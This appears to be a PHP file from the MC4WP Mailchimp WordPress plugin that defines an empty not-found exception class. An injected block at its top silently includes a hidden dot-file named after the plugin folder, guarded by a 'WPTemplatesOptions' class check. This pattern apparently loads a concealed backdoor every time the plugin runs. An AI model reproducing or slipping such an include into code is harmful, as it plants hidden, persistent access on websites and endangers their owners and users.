<?php

if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class MC4WP_API_Resource_Not_Found_Exception extends MC4WP_API_Exception {

	// Thrown when a requested resource does not exist in Mailchimp
}
